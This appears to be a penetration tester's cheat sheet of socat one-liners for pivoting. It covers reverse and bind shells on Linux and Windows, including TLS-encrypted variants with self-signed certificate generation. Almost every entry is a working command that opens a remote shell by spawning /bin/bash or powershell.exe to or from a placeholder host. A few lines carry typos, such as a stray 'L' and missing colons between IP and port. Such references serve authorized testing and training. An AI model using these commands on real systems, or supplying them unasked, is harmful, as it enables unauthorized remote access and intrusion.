# socat

% socat
#plateform/linux  #target/remote  #cat/PIVOT 


## reverse shell - linux listener
```bash
socat TCP4-LISTEN:<listen_port> STDOUT
```

## reverse shell - linux listener (full TTY)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<listen_port>
```

## reverse shell - linux binder ( full TTY)
```bash
socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP4:<connect_ip><connect_port>
```

## reverse shell (TLS) - linux listener (full TTY)
openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt ;cat <cert>.key <cert>.crt L > <cert>.pem 
```bash
socat file:`tty`,raw,echo=0 openssl-listen:<listen_port>,cert=<cert>.pem,verify=0,fork
```

## reverse shell (TLS) - linux binder
```bash
socat openssl:<connect_ip><connect_port>,verify=0 EXEC:/bin/bash
```

## reverse shell (TLS) - windows binder
```bash
socat openssl:<connect_ip><connect_port>,verify=0 EXEC:'powershell.exe',pipes
```

## bind shell - listener (linux)
```bash
socat TCP4-LISTEN:<listen_port> EXEC:/bin/bash
```

## bind shell - listener (windows)
```bash
socat TCP4-LISTEN:<listen_port> EXEC:'powershell.exe',pipes
```

## bind shell - binder 
```bash
socat - TCP4:<connect_ip>:<connect_port>
```

## bind shell (TLS) - listener (linux)
openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt &&
cat <cert>.key <cert>.crt L > <cert>.pem 
```bash
socat OPENSSl-LISTEN:<listen_port>,cert=<cert>.pem,verify=0,fork EXEC:/bin/bash
```

## bind shell (TLS) - listener (windows)
openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt &&
cat <cert>.key <cert>.crt L > <cert>.pem 
```bash
socat OPENSSl-LISTEN:<listen_port>,cert=<cert>.pem,verify=0,fork EXEC:'powershell.exe',pipes
```

## bind shell (TLS) - caller 
```bash
socat - OPENSSL:<connect_ip>:<connect_port>,verify=0
```